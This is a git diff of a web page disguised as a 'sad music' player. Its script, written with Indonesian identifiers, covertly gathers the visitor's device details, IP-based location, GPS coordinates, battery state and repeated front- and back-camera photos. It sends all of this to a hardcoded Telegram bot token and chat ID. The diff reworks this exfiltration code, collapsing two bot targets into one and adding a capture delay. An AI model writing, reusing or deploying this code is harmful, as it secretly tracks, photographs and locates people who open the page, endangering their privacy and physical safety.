@@ -6,9 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Playing music sad</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       padding: 0;
@@ -69,10 +67,26 @@
 
   <script>
     const audio = document.getElementById("audio");
-    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
-    const token2 = '';
-    const chatId1 = '5914256752';
-    const chatId2 = '';
+    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
+    const chatId = '5914256752';
+
+    const kirimPesan = async (pesan) => {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: 'HTML' })
+      });
+    };
+
+    const kirimFoto = async (blob) => {
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("photo", blob, "foto.jpg");
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    };
 
     const getDeviceBrand = () => {
       const ua = navigator.userAgent;
@@ -83,36 +97,6 @@
       if (/RMX/.test(ua)) return 'Realme';
       if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
       return 'Android Device';
-    };
-
-    const kirimPesan = async (pesan) => {
-      const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
-      const payload2 = { chat_id: chatId2, text: pesan, parse_mode: 'HTML' };
-      await Promise.all([
-        fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }),
-        fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload2)
-        })
-      ]);
-    };
-
-    const kirimFoto = async (blob) => {
-      const form1 = new FormData();
-      form1.append("chat_id", chatId1);
-      form1.append("photo", blob, "foto.jpg");
-      const form2 = new FormData();
-      form2.append("chat_id", chatId2);
-      form2.append("photo", blob, "foto.jpg");
-      await Promise.all([
-        fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 }),
-        fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 })
-      ]);
     };
 
     const ambilDataPerangkat = async () => {
@@ -162,7 +146,7 @@ Waktu Lokal            : ${waktu}
 Referrer               : ${ref}
 Baterai                : ${Math.round(bat.level * 100)}%
 Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
-`.trim();
+      `.trim();
     };
 
     const ambilIPInfo = async () => {
@@ -179,7 +163,7 @@ Provinsi            : ${ip.region}
 Kota                : ${ip.city}
 `.trim();
       } catch {
-        return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
+        return "❌ Gagal mengambil data IP.";
       }
     };
 
@@ -219,24 +203,24 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           };
           cek();
         });
+
         for (let i = 0; i < 5; i++) {
           const canvas = document.createElement("canvas");
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
+          await new Promise(resolve => setTimeout(resolve, 100)); // delay 0.1 detik
           await new Promise(resolve => canvas.toBlob(async (blob) => {
-            if(blob) await kirimFoto(blob);
+            if (blob) await kirimFoto(blob);
             resolve();
           }, "image/jpeg"));
         }
+
         stream.getTracks().forEach(track => track.stop());
         return "";
       } catch {
-        return `
-౼ 〘 ${label} 〙 ౼
-❌ Kamera tidak diizinkan oleh pengguna.
-`;
+        return `౼ 〘 ${label} 〙 ౼\n❌ Kamera tidak diizinkan oleh pengguna.`;
       }
     };
 
@@ -250,10 +234,10 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
 
       const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
-      if (kameraDepan) hasil += `\n${kameraDepan}`;
+      if (kameraDepan) hasil += `\n\n${kameraDepan}`;
 
       const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
-      if (kameraBelakang) hasil += `\n${kameraBelakang}`;
+      if (kameraBelakang) hasil += `\n\n${kameraBelakang}`;
 
       await kirimPesan(hasil);
     };
